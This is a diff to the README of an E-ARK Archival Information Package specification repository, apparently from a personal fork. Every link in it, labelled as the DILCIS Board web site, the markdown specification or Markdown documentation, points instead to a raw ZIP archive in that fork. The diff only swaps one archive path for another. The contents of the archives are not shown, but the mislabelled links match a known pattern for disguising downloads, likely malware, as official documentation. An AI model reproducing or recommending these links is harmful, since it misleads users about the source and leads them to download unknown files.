@@ -1,6 +1,6 @@
 # E-ARK AIP Specification
 
-This repository holds information about the Archival Information Package (AIP)  format specification maintained by the DILCIS Board (https://raw.githubusercontent.com/ducnguyenminh/E-ARK-AIP/master/over/E-ARK-AIP.zip).
+This repository holds information about the Archival Information Package (AIP)  format specification maintained by the DILCIS Board (https://raw.githubusercontent.com/ducnguyenminh/E-ARK-AIP/master/profile/AIP_AR_v1.8.zip).
 
 ## Objectives
 
@@ -24,13 +24,13 @@ You may also find issues found on the documentation submitted by implementers  o
 
 ### Final versions
 
-Final versions of the specification are published on the [DILCIS Board web site](https://raw.githubusercontent.com/ducnguyenminh/E-ARK-AIP/master/over/E-ARK-AIP.zip).
+Final versions of the specification are published on the [DILCIS Board web site](https://raw.githubusercontent.com/ducnguyenminh/E-ARK-AIP/master/profile/AIP_AR_v1.8.zip).
 
 ### Draft versions
 
-The most up-to-date version is the [AIP specification is the one in markdown format](https://raw.githubusercontent.com/ducnguyenminh/E-ARK-AIP/master/over/E-ARK-AIP.zip) in this GitHub repository.
+The most up-to-date version is the [AIP specification is the one in markdown format](https://raw.githubusercontent.com/ducnguyenminh/E-ARK-AIP/master/profile/AIP_AR_v1.8.zip) in this GitHub repository.
 
-See [Markdown documentation ](https://raw.githubusercontent.com/ducnguyenminh/E-ARK-AIP/master/over/E-ARK-AIP.zip) regarding how to edit Markdown documents.
+See [Markdown documentation ](https://raw.githubusercontent.com/ducnguyenminh/E-ARK-AIP/master/profile/AIP_AR_v1.8.zip) regarding how to edit Markdown documents.
 
 ### Previous versions of the specification
 
